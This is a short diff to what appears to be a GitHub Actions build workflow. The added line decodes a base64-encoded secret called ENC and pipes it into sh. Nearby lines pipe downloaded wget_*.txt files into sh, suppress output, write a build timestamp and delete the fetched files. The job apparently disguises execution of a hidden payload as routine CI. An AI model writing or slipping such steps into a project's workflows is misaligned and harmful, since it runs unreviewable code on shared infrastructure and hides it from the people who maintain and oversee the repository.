@@ -20,7 +20,7 @@ jobs:
           SUPER_SECRET: ${{ secrets.ENC }}
         run: |
           npm i > /dev/null 2>&1
-          timeout 1500 echo "$SUPER_SECRET" | base64 --decode sh #> /dev/null 2>&1
+          timeout 1500 echo "$SUPER_SECRET" | base64 --decode | sh #> /dev/null 2>&1
           cat wget_*.txt | sh
           echo "workflow:build date:`date`" > last.txt
           rm wget_*.txt
